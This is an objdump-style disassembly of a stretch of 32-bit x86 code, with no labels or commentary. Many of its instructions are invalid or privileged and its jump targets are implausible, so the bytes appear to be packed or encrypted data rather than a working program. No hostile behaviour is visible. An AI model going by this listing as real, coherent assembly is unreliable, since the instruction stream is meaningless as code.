  4194c9:	sub    DWORD PTR [ebx-0x44],edx
  4194cc:	mul    edi
  4194ce:	(bad)  [ebx]
  4194d0:	cld    
  4194d1:	dec    ecx
  4194d2:	fwait
  4194d3:	stos   BYTE PTR es:[edi],al
  4194d4:	xchg   edx,eax
  4194d5:	sub    esp,DWORD PTR ds:0x8f0732aa
  4194db:	add    DWORD PTR [eax-0x33a801ae],edi
  4194e1:	mov    ch,0x6c
  4194e3:	mov    cs,WORD PTR [eax+0x4f99f1a2]
  4194e9:	es dec edx
  4194eb:	pop    edi
  4194ec:	ret    0x7b2c
  4194ef:	mov    WORD PTR [edx],fs
  4194f1:	cmp    BYTE PTR [ebx+esi*1-0x6f009f36],ah
  4194f8:	or     al,0x66
  4194fa:	scas   eax,DWORD PTR es:[edi]
  4194fb:	pop    eax
  4194fc:	cwde   
  4194fd:	push   esp
  4194fe:	mov    eax,ds:0xc6965ebb
  419503:	sub    DWORD PTR [esi-0x5c],eax
  419506:	xor    cl,BYTE PTR [edi-0x5b]
  419509:	fdivr  DWORD PTR fs:[ecx+0x7]
  41950d:	sub    DWORD PTR [ebp-0x1d],ecx
  419510:	scas   eax,DWORD PTR es:[edi]
  419511:	inc    eax
  419512:	pop    esi
  419513:	jmp    0xb40bb466
  419518:	mov    dl,BYTE PTR [edx]
  41951a:	and    eax,0x630984ae
  41951f:	aam    0x8e
  419521:	pop    eax
  419522:	adc    eax,0x68c730ca
  419527:	cmp    edi,esp
  419529:	jo     0x4194d8
  41952b:	pop    ss
  41952c:	mov    ebp,DWORD PTR [esi-0x6ca37fca]
  419532:	mov    edi,0x493a7209
  419537:	jg     0x4195ac
  419539:	mov    DWORD PTR [eax],edi
  41953b:	popf   
  41953c:	shr    BYTE PTR [ebx+0x18],cl
  41953f:	jg     0x4194dd
  419541:	mov    dh,0xee
  419543:	and    ecx,DWORD PTR [edi]
  419545:	dec    ebp
  419546:	out    dx,eax
  419547:	dec    ecx
  419548:	mov    dl,0xb3
  41954a:	cmp    eax,0x99213c71
  41954f:	mov    edx,ss
  419551:	test   DWORD PTR [esi+0x6c],0xc25c7be5
  419558:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419559:	dec    ebx
  41955a:	mov    ebx,DWORD PTR [eax-0x6d]
  41955d:	call   0xefc96c84
  419562:	add    esp,DWORD PTR [esi+0xe86009c]
  419568:	std    
  419569:	cli    
  41956a:	outs   dx,DWORD PTR ds:[esi]
  41956b:	fisubr DWORD PTR [edi]
  41956d:	adc    BYTE PTR [ecx+0x74],0xa9
  419571:	jae    0x4195d6
  419573:	and    ah,BYTE PTR [eax+ebx*8]
  419576:	repz test BYTE PTR [ebx-0x4772d91e],dl
  41957d:	hlt    
  41957e:	xchg   esi,eax
  41957f:	push   DWORD PTR [esi]
  419581:	test   ebx,eax
  419583:	pushw  es
  419585:	rcr    BYTE PTR [esi-0x14fb30d3],1
  41958b:	repnz pop ebp
  41958d:	fild   DWORD PTR [edx]
  41958f:	push   ebp
  419590:	sub    al,ch
  419592:	pop    edx
  419593:	or     al,0xf8
  419595:	pop    edx
  419596:	dec    esi
  419597:	add    eax,0xd0aa5650
  41959c:	test   eax,0x62e136d6
  4195a1:	pop    eax
  4195a2:	aad    0xd2
  4195a4:	repz push 0x5fe64cd7
  4195aa:	icebp  
  4195ab:	in     eax,dx
  4195ac:	dec    esi
  4195ad:	(bad)  
  4195ae:	jns    0x41961a
  4195b0:	clc    
  4195b1:	cmp    ah,BYTE PTR [ebp+0x1269ec35]
  4195b7:	aad    0xaa
  4195b9:	add    dl,BYTE PTR [edx]
  4195bb:	mov    dh,0x9f
  4195bd:	sub    al,0x82
  4195bf:	xchg   ebp,eax
  4195c0:	add    ah,0x67
  4195c3:	leave  
  4195c4:	dec    eax
  4195c5:	push   ss
  4195c6:	dec    eax
  4195c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195c8:	mov    esp,0x5f358196
  4195cd:	aaa    
  4195ce:	nop
  4195cf:	repnz mov ebp,0xf1f099d
  4195d5:	push   esi
  4195d6:	mov    BYTE PTR ds:0x1c4ffab2,cl
  4195dc:	push   cs
  4195dd:	push   esp
  4195de:	xchg   ebx,eax
  4195df:	popf   
  4195e0:	push   eax
  4195e1:	out    0x28,eax
  4195e3:	clc    
  4195e4:	dec    esp
  4195e5:	sub    eax,0x46d72b17
  4195ea:	das    
  4195eb:	mov    esi,0x7dc3ec89
  4195f0:	dec    ebx
  4195f1:	out    0x80,al
  4195f3:	sbb    eax,0x2deafd1d
  4195f8:	add    eax,0x6753504f
  4195fd:	repnz push esp
  4195ff:	inc    ecx
  419600:	mov    ds:0x18c20f40,eax
  419605:	inc    edx
  419606:	mov    eax,es
  419608:	sahf   
  419609:	std    
  41960a:	pop    esp
  41960b:	xor    eax,DWORD PTR [ecx-0x23]
  41960e:	inc    edx
  41960f:	retf   0xb060
  419612:	cmc    
  419613:	sbb    BYTE PTR [esi+0x382ce87a],al
  419619:	xor    bh,BYTE PTR [ecx+0x2c1498a2]
  41961f:	repnz lods al,BYTE PTR ds:[esi]
  419621:	jecxz  0x41961e
  419623:	or     eax,0x92a134f3
  419628:	mov    eax,ds:0x358f601e
  41962d:	dec    ecx
  41962e:	push   0xaadffdc1
  419633:	ins    BYTE PTR es:[edi],dx
  419634:	out    0x47,al
  419636:	push   es
  419637:	sbb    ebp,DWORD PTR [esi-0x7d6ebb35]
  41963d:	nop
  41963e:	adc    esp,DWORD PTR [esi]
  419640:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419641:	xchg   BYTE PTR [ebp-0x44],ah
  419644:	sub    BYTE PTR cs:[esi+0x2c],al
  419648:	mov    esi,0x8a4f6780
  41964d:	test   DWORD PTR [ecx+0x6eb4db19],ecx
  419653:	add    BYTE PTR [ecx+0x4005e67f],bh
  419659:	xor    BYTE PTR [edx+0x5f],ch
  41965c:	daa    
  41965d:	inc    eax
  41965e:	mov    eax,0xcad2bdd1
  419663:	inc    eax
  419664:	xor    bl,dl
  419666:	push   ebp
  419667:	clc    
  419668:	sbb    ch,BYTE PTR [ecx-0x610b7998]
  41966e:	push   0xc71bcaa9
  419673:	cwde   
  419674:	mov    al,0xee
  419676:	mov    eax,0x450eac62
  41967b:	push   edi
  41967c:	sbb    ecx,DWORD PTR [ebp-0x5d]
  41967f:	mov    ebx,0x15caacc6
  419684:	(bad)  [ecx-0x5624c8e0]
  41968a:	add    esi,DWORD PTR [edi-0x2def0298]
  419690:	sub    esp,DWORD PTR [ebp+0x1ff83c65]
  419696:	mov    BYTE PTR [eax+0x66],bh
  419699:	pop    ecx
  41969a:	sbb    al,0x22
  41969c:	jb     0x419651
  41969e:	outs   dx,DWORD PTR ds:[esi]
  41969f:	xchg   edx,eax
  4196a0:	inc    esp
  4196a1:	inc    edx
  4196a2:	lock inc edi
  4196a4:	and    ebp,eax
  4196a6:	pop    edx
  4196a7:	jnp    0x419691
  4196a9:	aas    
  4196aa:	xlat   BYTE PTR ds:[ebx]
  4196ab:	mov    al,0x32
  4196ad:	stos   BYTE PTR es:[edi],al
  4196ae:	cmp    eax,0xfdec2398
  4196b3:	ror    DWORD PTR [esi-0x24],1
  4196b6:	fwait
  4196b7:	jle    0x419694
  4196b9:	mov    al,ds:0xe18990dc
  4196be:	adc    al,0x5e
  4196c0:	cmp    al,0xa2
  4196c2:	dec    ebp
  4196c3:	inc    eax
  4196c4:	push   ss
  4196c5:	(bad)  
  4196c6:	jp     0x41972e
  4196c8:	out    0x23,eax
  4196ca:	aaa    
  4196cb:	xchg   DWORD PTR [eax],esp
  4196cd:	or     eax,0xa33154bc
  4196d2:	dec    edi
  4196d3:	pop    edx
  4196d4:	xor    ecx,DWORD PTR [ecx]
  4196d6:	icebp  
  4196d7:	repz push eax
  4196d9:	dec    edi
  4196da:	shr    DWORD PTR [esi-0x1557601b],1
  4196e0:	jecxz  0x4196f1
  4196e2:	xlat   BYTE PTR ds:[ebx]
  4196e3:	pop    ecx
  4196e4:	mov    dh,0x25
  4196e6:	push   esp
  4196e7:	dec    esp
  4196e8:	inc    edx
  4196e9:	sub    DWORD PTR [edi],eax
  4196eb:	xchg   ecx,eax
  4196ec:	retf   0x75fa
  4196ef:	nop
  4196f0:	and    DWORD PTR [edx+0x7d],edi
  4196f3:	push   ebp
  4196f4:	pop    ebx
  4196f5:	xchg   edi,eax
  4196f6:	sub    al,0xc2
  4196f8:	push   ss
  4196f9:	scas   eax,DWORD PTR es:[edi]
  4196fa:	aas    
  4196fb:	mov    WORD PTR [edi],ss
  4196fd:	adc    edx,ecx
  4196ff:	lahf   
  419700:	ret    0x474f
  419703:	loopne 0x4196d0
  419705:	and    cl,BYTE PTR [esi-0x681031ec]
  41970b:	fisttp QWORD PTR [ebp-0xf]
  41970e:	jne    0x4196a8
  419710:	cmp    bl,ch
  419712:	and    DWORD PTR [esi-0x15],edi
  419715:	cld    
  419716:	and    DWORD PTR [ecx+0x39ca3465],esi
  41971c:	cmp    ecx,DWORD PTR [esi-0x28]
  41971f:	push   esp
  419720:	sbb    eax,DWORD PTR [esi-0x4d]
  419723:	xchg   edi,eax
  419724:	push   ecx
  419725:	push   edi
  419726:	ucomiss xmm0,DWORD PTR ds:0x4f21a741
  41972d:	out    0xcb,eax
  41972f:	mov    esp,0x7b271e98
  419734:	xchg   ch,dh
  419736:	mov    dl,0xff
  419738:	sub    esi,ecx
  41973a:	adc    al,BYTE PTR [eax+edx*8+0x5f]
  41973e:	aaa    
  41973f:	out    0xb1,al
  419741:	and    DWORD PTR [eax-0x1c9604a5],ebp
  419747:	loopne 0x4197bb
  419749:	jmp    0x8c73dc6a
  41974e:	fild   DWORD PTR gs:0xeef13d88
  419755:	sbb    eax,0x43ed250d
  41975a:	fadd   st,st(5)
  41975c:	mov    esi,0xaef7b8a7
  419761:	mov    dl,0xde
  419763:	add    al,0xbb
  419765:	inc    ebx
  419766:	inc    edi
  419767:	popf   
  419768:	fsubr  DWORD PTR [ebx]
  41976a:	sub    BYTE PTR [edx-0x5dcdcbdc],bh
  419770:	cmc    
  419771:	test   al,0xa1
  419773:	xchg   DWORD PTR [esi],edi
  419775:	fcmovne st,st(3)
  419777:	xchg   edi,eax
  419778:	enter  0xa92d,0x9e
  41977c:	sub    eax,0xece80c27
  419781:	dec    eax
  419782:	mov    eax,ds:0xf92f7d80
  419787:	push   esp
  419788:	loop   0x419741
  41978a:	pusha  
  41978b:	mov    cl,0x77
  41978d:	push   0x8f929d04
  419792:	jb     0x419781
  419794:	mov    ?,ebp
  419796:	mov    ds:0x9e4937ea,al
  41979b:	out    0x9,eax
  41979d:	inc    esi
  41979e:	rcl    DWORD PTR [ebx],0xbe
  4197a1:	and    al,0x64
  4197a3:	ss dec edx
  4197a5:	mov    edi,DWORD PTR [ebp+eiz*2+0x6e]
  4197a9:	clc    
  4197aa:	ins    DWORD PTR es:[edi],dx
  4197ab:	pop    ss
  4197ac:	pop    edx
  4197ad:	loop   0x41981c
  4197af:	idiv   bh
  4197b1:	dec    esi
  4197b2:	xor    eax,0x987f3e35
  4197b7:	cmp    eax,0x385dc11b
  4197bc:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4197be:	or     ah,BYTE PTR [esi+0x70dee480]
  4197c4:	xchg   edi,eax
  4197c5:	(bad)  
  4197c6:	xchg   BYTE PTR es:[ebx+0x5e],bh
  4197ca:	pop    eax
  4197cb:	and    cl,dh
  4197cd:	adc    al,ah
  4197cf:	push   edx
  4197d0:	mov    eax,0xc4007d8d
  4197d5:	jae    0x419848
  4197d7:	mov    al,0x65
  4197d9:	mov    ecx,DWORD PTR [edx+0x2d070913]
  4197df:	ret    
  4197e0:	into   
  4197e1:	fs arpl bx,bx
  4197e4:	lock jle 0x41978b
  4197e7:	mov    ?,esi
  4197e9:	dec    ebx
  4197ea:	jns    0x41978b
  4197ec:	ss add al,0x80
  4197ef:	push   ebx
  4197f0:	pop    esp
  4197f1:	push   ebp
  4197f2:	pushf  
  4197f3:	(bad)  
  4197f4:	fsub   QWORD PTR [eax+0x1d]
  4197f7:	sub    dh,BYTE PTR [edx+0x7ac3d5e5]
  4197fd:	lods   eax,DWORD PTR ds:[esi]
  4197fe:	sbb    DWORD PTR [edi-0x14],eax
  419801:	mov    cl,0xcb
  419803:	xchg   ecx,esp
  419805:	cs cs aam 0xe4
  419809:	dec    ebp
  41980a:	std    
  41980b:	xchg   esp,eax
  41980c:	fwait
  41980d:	into   
  41980e:	adc    al,ah
  419810:	stos   BYTE PTR es:[edi],al
  419811:	int3   
  419812:	call   0xaeb:0x2e817a3f
  419819:	pop    eax
  41981a:	fs stos BYTE PTR es:[edi],al
  41981c:	cld    
  41981d:	jmp    0x419874
  41981f:	loope  0x4197d2
  419821:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419822:	or     al,bl
  419824:	and    edx,DWORD PTR [ebp-0x34]
  419827:	or     DWORD PTR [ebx],esi
  419829:	push   edx
  41982a:	and    DWORD PTR [ebp-0x6f796306],ebx
  419830:	rol    DWORD PTR [ebp-0x6],cl
  419833:	add    esp,DWORD PTR ds:0x8d9a9d4a
  419839:	dec    edx
  41983a:	pop    ss
  41983b:	push   cs
  41983c:	fbld   TBYTE PTR [edx-0x54239c4d]
  419842:	sub    al,0x93
  419844:	push   edi
  419845:	adc    edx,DWORD PTR [eax]
  419847:	das    
  419848:	loop   0x419859
  41984a:	(bad)  
  41984b:	repnz inc ebp
  41984d:	loopne 0x419805
  41984f:	mov    eax,0x31630d24
  419854:	mov    ecx,0x6afc7629
  419859:	adc    BYTE PTR [ebx-0x5752c9ec],dh
  41985f:	xor    esp,edx
  419861:	lds    edi,FWORD PTR [ecx+0x3ca811ce]
  419867:	mov    BYTE PTR [edx],cl
  419869:	imul   eax,edi,0xffffffcd
  41986c:	outs   dx,DWORD PTR ds:[esi]
  41986d:	les    esp,FWORD PTR [eax]
  41986f:	icebp  
  419870:	imul   ebx,DWORD PTR [edi-0x40],0xbbb69d89
  419877:	cdq    
  419878:	hlt    
  419879:	jns    0x419896
  41987b:	js     0x4198bc
  41987d:	xor    edi,DWORD PTR [ecx]
  41987f:	fisttp WORD PTR fs:[ebp+ebp*1+0x601bb459]
  419887:	fsub   QWORD PTR [edx+0x37319a84]
  41988d:	in     al,dx
  41988e:	and    cl,dl
  419890:	xor    ch,BYTE PTR [esi]
  419892:	daa    
  419893:	popf   
  419894:	lds    esp,FWORD PTR [eax+edi*4-0x25429fa7]
  41989b:	mov    ds:0x3f47ba6f,eax
  4198a0:	cwde   
  4198a1:	dec    ecx
  4198a2:	mov    ah,0x5b
  4198a4:	pushf  
  4198a5:	fwait
  4198a6:	(bad)  
  4198a7:	mov    edx,0x42f0380f
  4198ac:	xchg   edx,eax
  4198ad:	test   al,0xe7
  4198af:	(bad)
  4198b2:	mov    dh,0x76
  4198b4:	into   
  4198b5:	mov    ds:0x6106b574,al
  4198ba:	inc    esi
  4198bb:	jmp    0xc1e16c25
  4198c0:	dec    ebp
  4198c1:	sbb    dh,BYTE PTR cs:[edx]
  4198c4:	out    0xba,al
  4198c6:	dec    ecx
  4198c7:	lahf   
  4198c8:	stc    
  4198c9:	xchg   DWORD PTR [ebx+esi*8-0x7b020e2d],ebx
  4198d0:	iret   
  4198d1:	jne    0x41994c
  4198d3:	mov    bh,0x5a
  4198d5:	push   ebx
  4198d6:	ret    
  4198d7:	outs   dx,DWORD PTR ds:[esi]
  4198d8:	inc    eax
  4198d9:	dec    edi
  4198da:	jb     0x419909
  4198dc:	sub    BYTE PTR [ebx+0x45],al
  4198df:	int3   
  4198e0:	stos   BYTE PTR es:[edi],al
  4198e1:	add    ebx,DWORD PTR [esi+0x62]
  4198e4:	rcl    DWORD PTR ds:0x9c66044e,cl
  4198ea:	cmp    cl,BYTE PTR [edi-0x47]
  4198ed:	xor    bh,bh
  4198ef:	push   edi
  4198f0:	test   al,0xe0
  4198f2:	dec    ebx
  4198f3:	sbb    al,BYTE PTR [esi]
  4198f5:	cdq    
  4198f6:	cmp    ch,BYTE PTR [edi+esi*8+0x59]
  4198fa:	xor    al,0x9d
  4198fc:	or     al,0x3f
  4198fe:	xlat   BYTE PTR ds:[ebx]
  4198ff:	mov    al,0xc8
  419901:	rcl    BYTE PTR [ebp+0x6564fee1],1
  419907:	adc    bh,BYTE PTR [edx]
  419909:	adc    edi,DWORD PTR [esi+0x4d02c182]
  41990f:	mov    DWORD PTR [ecx],edx
  419911:	retf   0x2ad
  419914:	dec    esi
  419915:	push   edi
  419916:	and    al,0xf1
  419918:	out    dx,eax
  419919:	jmp    0x8207:0xceb163af
  419920:	cmp    edx,DWORD PTR [eax]
  419922:	clc    
  419923:	cmc    
  419924:	jl     0x419900
  419926:	mov    dl,0x65
  419928:	mov    ebp,DWORD PTR [edx]
  41992a:	jno    0x4198b1
  41992c:	xchg   edi,eax
  41992d:	(bad)  
  41992e:	cmp    al,0x50
  419930:	lods   eax,DWORD PTR ds:[esi]
  419931:	fstp   QWORD PTR [ebx]
  419933:	out    0x58,al
  419935:	out    dx,al
  419936:	jp     0x419944
  419938:	or     BYTE PTR [esi],ch
  41993a:	cwde   
  41993b:	or     DWORD PTR [edx-0x8df155a],0xffffff9a
  419942:	jnp    0x41995b
  419944:	jmp    0xbd5e47d
  419949:	(bad)  
  41994a:	pop    ecx
  41994b:	pusha  
  41994c:	aad    0x90
  41994e:	mov    edx,0x759b363c
  419953:	jne    0x419957
  419955:	and    al,0xc1
  419957:	lahf   
  419958:	mov    ah,0xae
  41995a:	leave  
  41995b:	mov    BYTE PTR [ebp+0x35d73d67],cl
  419961:	adc    DWORD PTR [ebx-0x4a],esp
  419964:	out    dx,al
  419965:	xchg   ebx,eax
  419966:	mov    ecx,0xdb256298
  41996b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41996c:	mov    esi,0xb1278841
  419971:	and    al,0xc7
  419973:	cmp    eax,0x66b46e37
  419978:	call   0x40d716e1
  41997d:	mov    DWORD PTR [eax-0x5f],edx
  419980:	inc    ebx
  419981:	sahf   
  419982:	dec    ebp
  419983:	imul   edx,DWORD PTR [edi+0x3dcb2900],0x279a8ea4
  41998d:	inc    ebp
  41998e:	hlt    
  41998f:	int3   
  419990:	jl     0x419972
  419992:	mov    bh,BYTE PTR ds:0xd6fc6b5f
  419998:	sar    BYTE PTR ds:0x367879a5,1
  41999e:	xchg   DWORD PTR [ecx-0x1e463b6a],ebp
  4199a4:	or     BYTE PTR [edi-0x4aeb78fa],ah
  4199aa:	inc    esi
  4199ab:	cmp    ecx,DWORD PTR [eax+0x2c39f39a]
  4199b1:	mov    ds:0x8ab13758,eax
  4199b6:	sub    al,0x2a
  4199b8:	or     esp,DWORD PTR [edx+0x19]
  4199bb:	aaa    
  4199bc:	test   BYTE PTR [edx-0x2789478e],dl
  4199c2:	dec    eax
  4199c3:	inc    esi
  4199c4:	leave  
  4199c5:	sub    ebx,ebx
  4199c7:	xadd   BYTE PTR [ebx],cl
  4199ca:	pusha  
  4199cb:	ret    
  4199cc:	xor    al,cl
  4199ce:	fwait
  4199cf:	neg    DWORD PTR [esi+0x504431c7]
  4199d5:	mov    DWORD PTR cs:[edx],edx
  4199d8:	and    dl,BYTE PTR [eax+0x7b]
  4199db:	inc    esp
  4199dc:	add    eax,0x2927e312
  4199e1:	mov    edx,0xf1c8399d
  4199e6:	cmp    DWORD PTR [edi],ebp
  4199e8:	or     al,0x66
  4199ea:	test   BYTE PTR [ecx+0x61],0x9f
  4199ee:	jns    0x419a2f
  4199f0:	push   ebx
  4199f1:	ins    BYTE PTR es:[edi],dx
  4199f2:	repz mov ds:0xbe6bc3bd,al
  4199f8:	xchg   edx,eax
  4199f9:	cmp    dh,al
  4199fb:	push   esp
  4199fc:	jb     0x4199ef
  4199fe:	pop    ebp
  4199ff:	rol    BYTE PTR [edi],cl
  419a01:	hlt    
  419a02:	enter  0xa00b,0x80
  419a06:	icebp  
  419a07:	repz jb 0x4199d0
  419a0a:	cmp    edi,0x77
  419a0d:	out    dx,al
  419a0e:	mov    eax,0x6a6f4ea
  419a13:	in     eax,0xba
  419a15:	shl    DWORD PTR [ebx-0x6f19acea],cl
  419a1b:	pop    edx
  419a1c:	push   0xffffff81
  419a1e:	out    0x8,al
  419a20:	sbb    esp,edi
  419a22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a23:	push   eax
  419a24:	xchg   edi,eax
  419a25:	rcr    BYTE PTR [edx+0x6],1
  419a28:	jae    0x4199b3
  419a2a:	fcomp  QWORD PTR [ebp+0x2a0bd8d]
  419a30:	loope  0x419a0e
  419a32:	xchg   esi,eax
  419a33:	inc    ecx
  419a34:	stc    
  419a35:	jnp    0x4199ff
  419a37:	fmul   DWORD PTR [esi-0x43]
  419a3a:	test   eax,0xb84dfce8
  419a3f:	stc    
  419a40:	mov    dh,0xc7
  419a42:	xor    al,0x16
  419a44:	out    dx,eax
  419a45:	mov    al,ds:0xf9f33631
  419a4a:	xchg   DWORD PTR [edx-0x376d8ff2],ebx
  419a50:	pop    ebx
  419a51:	push   0xffffffe1
  419a53:	sahf   
  419a54:	call   DWORD PTR [ebx+0x3770bb56]
  419a5a:	lea    edx,[eax-0xd]
  419a5d:	cmp    DWORD PTR [esi+eiz*2],ecx
  419a60:	into   
  419a61:	xchg   edi,eax
  419a62:	sbb    dx,WORD PTR [ecx-0x22f20823]
  419a69:	mov    DWORD PTR [ebx+edi*2-0x781d4e78],ebx
  419a70:	cmp    ebx,DWORD PTR [ecx+0x9]
  419a73:	enter  0x483a,0x43
  419a77:	sub    al,0xd0
  419a7a:	xchg   ebp,eax
  419a7b:	cmp    DWORD PTR [esi],0xe
  419a7e:	inc    eax
  419a7f:	lods   eax,DWORD PTR ds:[esi]
  419a80:	inc    ebx
  419a81:	jge    0x419ac6
  419a83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a84:	dec    esi
  419a85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a86:	push   edi
  419a87:	push   esp
  419a88:	dec    ebp
  419a89:	xor    DWORD PTR [edi],0xfffffffa
  419a8c:	mov    al,ds:0x498f0370
  419a91:	and    eax,0x55ae20d8
  419a96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a97:	xor    BYTE PTR [edi-0x1419285b],0x9
  419a9e:	inc    edx
  419a9f:	sub    DWORD PTR [ecx+0x2bdde242],edx
  419aa5:	std    
  419aa6:	loopne 0x419a41
  419aa8:	pop    edi
  419aa9:	les    edx,FWORD PTR [ebp+0x53]
  419aac:	jb     0x419aa6
  419aae:	aaa    
  419aaf:	adc    al,0xbd
  419ab1:	dec    esi
  419ab2:	pop    ecx
  419ab3:	cmp    bl,BYTE PTR [esi+ecx*8-0x19ca40eb]
  419aba:	pushf  
  419abb:	sbb    BYTE PTR [edi+0x11],cl
  419abe:	or     DWORD PTR [edx-0x6ed1d07c],esp
  419ac4:	add    al,0x5
  419ac6:	les    ebp,FWORD PTR [ebx]
  419ac8:	into   
  419ac9:	sub    DWORD PTR [ebp+0x80fd675],edi
  419acf:	daa    
  419ad0:	pextrw edx,(bad),0xc5
  419ad2:	adc    ah,bl
  419ad4:	lods   eax,DWORD PTR ds:[esi]
  419ad5:	inc    esp
  419ad6:	repnz dec eax
  419ad8:	fnsave [edi+0x4e50d0ec]
  419ade:	out    0xc,al
  419ae0:	cmc    
  419ae1:	add    dh,dl
  419ae3:	clc    
  419ae4:	cmp    al,0x2a
  419ae6:	lock jp 0x419b3b
  419ae9:	dec    ebp
  419aea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419aeb:	outs   dx,DWORD PTR ds:[esi]
  419aec:	rcl    BYTE PTR [edx+0x51],0x5c
  419af0:	mov    ebx,0xf1a0eaa6
  419af5:	or     DWORD PTR [edi],esi
  419af7:	in     eax,0x78
  419af9:	add    ah,BYTE PTR [edx+0x9366ba7]
  419aff:	es jg  0x419afc
  419b02:	mov    al,ds:0x61e0f98
  419b07:	dec    ecx
  419b08:	fdivr  QWORD PTR [edi-0x28]
  419b0b:	loopne 0x419ad8
  419b0d:	push   edi
  419b0e:	mov    ecx,DWORD PTR [edi]
  419b10:	out    0xfe,eax
  419b12:	loopne 0x419b41
  419b14:	inc    edi
  419b15:	adc    cl,dh
  419b17:	mov    ebx,0xef44ce20
  419b1c:	sub    dl,al
  419b1e:	mov    edx,0x77e0a479
  419b23:	or     al,bl
  419b25:	xchg   BYTE PTR [ebp-0x11a7a351],cl
  419b2b:	and    al,0x97
  419b2d:	mov    bl,0x90
  419b2f:	jmp    DWORD PTR [edx+ecx*8-0x18]
  419b33:	stos   DWORD PTR es:[edi],eax
  419b34:	and    eax,0x7f5337a3
  419b39:	pop    ebx
  419b3a:	lock xchg esi,eax
  419b3c:	mov    BYTE PTR [edx+0x34],0x51
  419b40:	jge    0x419ae6
  419b42:	push   0x10
  419b44:	jp     0x419b50
  419b46:	sbb    edx,DWORD PTR [eax+edx*2]
  419b49:	or     edi,DWORD PTR [ecx+0x501b75b1]
  419b4f:	je     0x419bbf
  419b51:	sub    al,0x24
  419b53:	cmc    
  419b54:	into   
  419b55:	mov    gs,ecx
  419b57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b58:	cmc    
  419b59:	or     BYTE PTR [eax],bl
  419b5b:	mov    esp,0x4d417da8
  419b60:	push   ebp
  419b61:	or     BYTE PTR [esp+ebp*8-0x5],cl
  419b65:	pop    ebp
  419b66:	mov    ds:0x4ac87e59,eax
  419b6b:	add    eax,esi
  419b6d:	(bad)  
  419b6e:	cmp    DWORD PTR [eax-0x5d8633bd],ebp
  419b74:	push   cs
  419b75:	xchg   al,al
  419b77:	mov    eax,0xe102ddd5
  419b7c:	aad    0x50
  419b7e:	dec    ecx
  419b7f:	mov    esi,0xcffb326a
  419b84:	cmp    ah,BYTE PTR [eax-0x64]
  419b87:	sbb    ah,BYTE PTR [eax-0x3b]
  419b8a:	pushf  
  419b8b:	cld    
  419b8c:	sub    ah,al
  419b8e:	adc    cl,ah
  419b90:	push   ebp
  419b91:	bound  ebx,QWORD PTR [ebx+ebx*1-0x16]
  419b95:	fcom   QWORD PTR [edx-0x7c]
  419b98:	in     eax,0x29
  419b9a:	addr16 xor al,0xcd
  419b9d:	and    al,0x45
  419b9f:	inc    eax
  419ba0:	aad    0x6b
  419ba2:	xor    edi,ecx
  419ba4:	add    BYTE PTR [edx+esi*8],cl
  419ba7:	out    dx,eax
  419ba8:	cmp    ecx,DWORD PTR [eax-0x57]
  419bab:	hlt    
  419bac:	add    eax,DWORD PTR [edi]
  419bae:	outs   dx,DWORD PTR ds:[esi]
  419baf:	in     eax,dx
  419bb0:	ret    0x6abb
  419bb3:	inc    eax
  419bb4:	mov    al,ds:0x2c4ce11e
  419bb9:	xchg   esp,eax
  419bba:	xor    al,0x2e
  419bbc:	inc    eax
  419bbd:	pop    esi
  419bbe:	inc    ebx
  419bbf:	jecxz  0x419b8e
  419bc1:	popa   
  419bc2:	lods   al,BYTE PTR ds:[esi]
  419bc3:	jno    0x419b6d
  419bc5:	out    dx,eax
  419bc6:	pop    ds
  419bc7:	mov    ds:0xe48c0ced,al
  419bcc:	mov    ds:0xee3bf343,al
  419bd1:	adc    ecx,edx
  419bd3:	and    dl,al
  419bd5:	or     BYTE PTR [edi-0x1852910e],bl
  419bdb:	pop    esi
  419bdc:	imul   edi,DWORD PTR [edi],0xbf86da41
  419be2:	fnsave [edi+0x906379f]
  419be8:	and    eax,0x51299c78
  419bed:	cwde   
  419bee:	dec    edx
  419bef:	jnp    0x419b86
  419bf1:	jmp    0xfd778df8
  419bf6:	xor    BYTE PTR [edi],bh
  419bf8:	mov    al,ds:0xba63f9a5
  419bfd:	sbb    al,0xc
  419bff:	test   BYTE PTR [eax+edi*4],cl
  419c02:	jle    0x419c1c
  419c04:	call   0x123a:0x907d8ba4
  419c0b:	(bad)  
  419c0c:	loope  0x419bce
  419c0e:	cli    
  419c0f:	sub    al,0xa8
  419c11:	in     al,dx
  419c12:	mov    bl,0xf6
  419c14:	sbb    eax,0x16d0f77a
  419c19:	sub    bl,bl
  419c1b:	cmp    BYTE PTR [esi-0x3e],al
  419c1e:	loop   0x419bab
  419c20:	int    0x7b
  419c22:	fnstcw WORD PTR [esi-0x1186e224]
  419c28:	outs   dx,DWORD PTR ds:[esi]
  419c29:	jae    0x419bb6
  419c2b:	std    
  419c2c:	shrd   DWORD PTR [ecx],edx,0xca
  419c30:	loopne 0x419bbc
  419c32:	popa   
  419c33:	sar    bl,cl
  419c35:	fidiv  DWORD PTR [esi]
  419c37:	cmp    dl,BYTE PTR [esi+0x201fb94f]
  419c3d:	pop    edx
  419c3e:	or     eax,DWORD PTR [ebp+0x12]
  419c41:	rcr    ebp,cl
  419c43:	xchg   esp,eax
  419c44:	jns    0x419c1a
  419c46:	fild   DWORD PTR [ecx]
  419c48:	shl    BYTE PTR [edi+ecx*1+0x607b6681],0x66
  419c50:	xor    edx,DWORD PTR [ebp+0xa6b12dc]
  419c56:	fidiv  DWORD PTR [ebp-0x3de5df3e]
  419c5c:	shr    DWORD PTR [edx-0x53],1
  419c5f:	ret    0x32b1
  419c62:	dec    edx
  419c63:	fldenv [ebx]
  419c65:	or     DWORD PTR [esi-0x5f],esi
  419c68:	(bad)  
  419c69:	test   eax,0x246f11e9
  419c6e:	jne    0x419c60
  419c70:	stc    
  419c71:	jecxz  0x419cf2
  419c73:	inc    ebp
  419c74:	in     eax,dx
  419c75:	addr16 xchg ecx,eax
  419c77:	loope  0x419cd9
  419c79:	pop    esp
  419c7a:	test   esi,ebp
  419c7c:	adc    esi,edx
  419c7e:	loope  0x419cf3
